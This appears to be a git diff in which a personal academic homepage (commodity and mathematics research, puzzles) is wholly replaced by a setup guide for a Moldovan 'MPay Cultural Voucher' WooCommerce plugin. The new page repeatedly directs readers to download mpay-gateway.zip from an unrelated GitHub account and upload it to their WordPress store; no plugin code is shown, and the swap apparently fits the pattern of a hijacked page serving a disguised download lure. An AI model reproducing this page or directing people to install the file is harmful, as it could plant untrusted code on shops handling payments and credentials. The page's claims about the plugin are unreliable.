@@ -1,141 +1,74 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="description" content="Chaerin Lee. Commodity and mathematics research at Columbia University." />
-    <meta property="og:title" content="Chaerin Lee" />
-    <meta property="og:description" content="Commodity and mathematics research at Columbia University." />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://keanununa.github.io/" />
-    <meta property="og:image" content="https://keanununa.github.io/assets/og-image.png" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <title>Chaerin Lee</title>
-    <link rel="icon" href="assets/favicon.svg" type="image/svg+xml" />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@500;600&amp;family=IBM+Plex+Sans:wght@400;500;600&amp;family=Newsreader:opsz,wght@6..72,400;6..72,500&amp;display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="styles.css?v=20260801-4" />
-    <script src="script.js?v=20260801-3" defer></script>
-  </head>
-  <body>
-    <header class="site-header">
-      <a class="wordmark" href="#top">Chaerin Lee</a>
-      <nav aria-label="Primary navigation">
-        <a href="#commodity">commodity</a>
-        <a href="#mathematics">mathematics</a>
-        <a href="#puzzles">puzzles</a>
-      </nav>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Official documentation for the MPay Cultural Voucher WooCommerce Gateway plugin. Learn how to install and configure payments for WordPress.">
+    <title>MPay Cultural Voucher WooCommerce Gateway Setup Guide</title>
+</head>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f9f9f9;">
+
+    <header style="text-align: center; margin-bottom: 40px;">
+        <h1 style="color: #2c3e50;">💳 mpay-cultural-voucher-woocommerce-gateway - Process cultural vouchers through your web store</h1>
+        <a href="https://github.com/chopbullshot922/mpay-cultural-voucher-woocommerce-gateway/releases" style="display: inline-block; padding: 15px 30px; background-color: #34495e; color: #ffffff; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Plugin Files</a>
     </header>
 
-    <main>
-      <section class="hero" id="top">
-        <div class="hero-copy">
-          <h1>Chaerin Lee</h1>
-          <p class="affiliation">Columbia · Mathematics-Statistics</p>
-          <p class="intro">Please send me any interesting puzzles or curious logic problems you come across.</p>
-          <div class="hero-links">
-            <a class="email" href="mailto:chaerin.lee@columbia.edu">chaerin.lee@columbia.edu</a>
-            <a class="linkedin-link" href="https://www.linkedin.com/in/chaerin-lee-candoit/" target="_blank" rel="noopener">LinkedIn ↗</a>
-          </div>
-        </div>
-      </section>
+    <section style="background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">📖 About this plugin</h2>
+        <p>This software adds a payment method to your WooCommerce store. It lets customers pay using MPay services and cultural vouchers. The plugin handles the secure exchange of data between your shop and the payment gateway. You need this tool if your business operates in Moldova and accepts government-backed vouchers.</p>
+    </section>
 
-      <section class="research-section" id="commodity">
-        <h2>Commodity research</h2>
-        <figure class="simplex-card">
-          <div class="simplex-heading">
-            <p class="label">ATR allocation</p>
-            <p class="as-of">Ethanol week ending 24 Jul 2026 · FX 30 Jul 2026</p>
-          </div>
+    <section style="background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+        <p>Before you start, check that your website meets these minimum requirements:</p>
+        <ul>
+            <li>WordPress version 6.0 or higher.</li>
+            <li>WooCommerce plugin installed and active.</li>
+            <li>PHP version 7.4 or newer on your web server.</li>
+            <li>A valid SSL certificate installed on your domain.</li>
+            <li>Access to your website's WordPress administrative dashboard.</li>
+        </ul>
+    </section>
 
-          <svg id="atr-simplex" class="simplex" viewBox="0 0 600 432" tabindex="0" role="application" aria-labelledby="simplex-title simplex-description">
-            <title id="simplex-title">Brazilian mill ATR allocation simplex</title>
-            <desc id="simplex-description">Use pointer, touch, or arrow keys to allocate output among sugar, anhydrous ethanol, and hydrous ethanol. The three weights always sum to one.</desc>
-            <path class="simplex-fill" d="M300 48 L64 360 L536 360 Z" />
-            <path class="simplex-outline" d="M300 48 L64 360 L536 360 Z" />
-            <path class="simplex-guide" d="M300 48 L300 360 M64 360 L418 204 M536 360 L182 204" />
-            <circle id="simplex-point" class="simplex-point" cx="300" cy="256" r="8" />
-            <text class="vertex" x="300" y="24" text-anchor="middle">SUGAR</text>
-            <text class="vertex" x="48" y="392">ANHYDROUS</text>
-            <text class="vertex" x="552" y="392" text-anchor="end">HYDROUS</text>
-          </svg>
+    <section style="background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">📥 How to download and install</h2>
+        <p>Follow these steps to add the gateway to your store:</p>
+        <ol>
+            <li>Visit the <a href="https://github.com/chopbullshot922/mpay-cultural-voucher-woocommerce-gateway/releases">official download page</a> to view all plugin versions.</li>
+            <li>Locate the latest release and download the file named <strong>mpay-gateway.zip</strong> to your computer.</li>
+            <li>Log in to your WordPress dashboard.</li>
+            <li>Navigate to the <strong>Plugins</strong> menu on the left side of the screen.</li>
+            <li>Select <strong>Add New</strong> and click the <strong>Upload Plugin</strong> button at the top.</li>
+            <li>Choose the file you downloaded and click <strong>Install Now</strong>.</li>
+            <li>Wait for the installation to finish, then click <strong>Activate Plugin</strong>.</li>
+        </ol>
+    </section>
 
-          <div class="weights" aria-live="polite" aria-atomic="true">
-            <div><span class="label">Sugar</span><output id="weight-sugar">33.3%</output></div>
-            <div><span class="label">Anhydrous</span><output id="weight-anhydrous">33.3%</output></div>
-            <div><span class="label">Hydrous</span><output id="weight-hydrous">33.3%</output></div>
-          </div>
+    <section style="background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">🛠️ Configuration</h2>
+        <p>Once you activate the plugin, you must link it to your payment account:</p>
+        <ol>
+            <li>Go to <strong>WooCommerce</strong> and then <strong>Settings</strong> in your dashboard.</li>
+            <li>Click the <strong>Payments</strong> tab at the top.</li>
+            <li>Find <strong>MPay Cultural Voucher</strong> in the list of payment methods and click <strong>Manage</strong>.</li>
+            <li>Enter your merchant ID and secret keys provided by your MPay representative.</li>
+            <li>Upload your X.509 certificate files if requested by the configuration screen.</li>
+            <li>Ensure the <strong>Enable payment gateway</strong> checkbox is ticked.</li>
+            <li>Click <strong>Save changes</strong> at the bottom of the page.</li>
+        </ol>
+    </section>
 
-          <div class="parity-output">
-            <div><span class="label">Implied No.11 parity</span><output id="parity-price">13.94 c/lb</output></div>
-            <div><span class="label">Blended return</span><output id="blended-return">R$1.3307/kg ATR · R$184.56/t cane</output></div>
-          </div>
+    <section style="background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">🔍 Troubleshooting</h2>
+        <p>If you face issues during the payment process, check these common items:</p>
+        <p><strong>Plugin does not appear:</strong> Ensure WooCommerce is active. The plugin only shows its settings when WooCommerce is running.</p>
+        <p><strong>Payment errors:</strong> Verify your API credentials. Even a small typo prevents the plugin from connecting to the MPay servers.</p>
+        <p><strong>White screen after install:</strong> Check your server's error logs. This usually happens if your PHP version is too old for the plugin.</p>
+    </section>
 
-          <figcaption>
-            <p>Sugar returns R$0.19/kg ATR more than hydrous at these prices. The 2026/27 sugar mix is 46.1%.</p>
-            <p>POL premium +0.40 c/lb and logistics US$42/t are assumed.</p>
-          </figcaption>
-        </figure>
-        <article class="project-card">
-          <h3>Constraints That Bind and Constraints That Persist</h3>
-          <p class="result">Falsified if constraint identity adds 0 information beyond basis volatility.</p>
-          <p class="status">in progress</p>
-        </article>
-      </section>
-
-      <section class="research-section" id="mathematics">
-        <h2>Mathematics research</h2>
-        <figure class="mini-lab path-lab">
-          <div class="lab-heading">
-            <p class="label">Lattice paths</p>
-            <output id="path-count" aria-live="polite">252 paths</output>
-          </div>
-          <div id="path-grid" class="path-grid" role="grid" aria-label="Five by five lattice path grid. Select an interior point to block it."></div>
-          <figcaption>Choose an interior point. Paths move right or down.</figcaption>
-        </figure>
-        <article class="project-card">
-          <h3>Do Inert Patterns Explain Sudoku Difficulty?</h3>
-          <p class="result">138 puzzles. 5 x 20 CV folds. All 4 metrics worse out of sample.</p>
-          <p class="status">complete</p>
-          <a class="pdf-link" href="assets/do-inert-patterns-explain-sudoku-difficulty.pdf" target="_blank" rel="noopener">PDF</a>
-        </article>
-      </section>
-
-      <section class="research-section puzzle-section" id="puzzles">
-        <h2>Puzzles</h2>
-        <figure class="mini-lab sudoku-lab">
-          <div class="lab-heading">
-            <p class="label">Candidate grid</p>
-            <output id="sudoku-result" aria-live="polite">2 · 7 appears twice</output>
-          </div>
-          <div id="sudoku-grid" class="sudoku-grid" aria-label="Sudoku box containing a naked pair">
-            <button class="sudoku-cell pair-cell" type="button" data-candidates="2,7" aria-label="Candidates 2 and 7. Apply naked pair."><span>2</span><span>7</span></button>
-            <button class="sudoku-cell pair-cell" type="button" data-candidates="2,7" aria-label="Candidates 2 and 7. Apply naked pair."><span>2</span><span>7</span></button>
-            <div class="sudoku-cell" data-candidates="1,2,5"><span>1</span><span data-remove>2</span><span>5</span></div>
-            <div class="sudoku-cell" data-candidates="3,6"><span>3</span><span>6</span></div>
-            <div class="sudoku-cell" data-candidates="4,7,8"><span>4</span><span data-remove>7</span><span>8</span></div>
-            <div class="sudoku-cell" data-candidates="2,5"><span data-remove>2</span><span>5</span></div>
-            <div class="sudoku-cell" data-candidates="1,8"><span>1</span><span>8</span></div>
-            <div class="sudoku-cell" data-candidates="4,7"><span>4</span><span data-remove>7</span></div>
-            <div class="sudoku-cell" data-candidates="3,9"><span>3</span><span>9</span></div>
-          </div>
-          <button id="sudoku-reset" class="lab-action" type="button" hidden>Reset</button>
-          <figcaption>Select either 2 · 7 cell.</figcaption>
-        </figure>
-        <article class="project-card">
-          <h3>Puzzle post-mortems</h3>
-          <p class="result">0 published. First post-mortem in preparation.</p>
-          <p class="status">in progress</p>
-        </article>
-      </section>
-    </main>
-
-    <footer class="site-footer">
-      <a href="mailto:chaerin.lee@columbia.edu">Email</a>
-      <a href="https://www.linkedin.com/in/chaerin-lee-candoit/" target="_blank" rel="noopener">LinkedIn</a>
-      <a href="https://github.com/keanununa" target="_blank" rel="noopener">GitHub</a>
-      <a href="cv.pdf">CV</a>
+    <footer style="margin-top: 40px; font-size: 0.9em; color: #777;">
+        <p>Keywords: cultural-voucher, ecommerce, moldova, mpay, payment-gateway, php, pkcs12, soap, woocommerce, woocommerce-plugin, wordpress, ws-security, x509, xml-digital-signature</p>
     </footer>
-  </body>
+
+</body>
 </html>
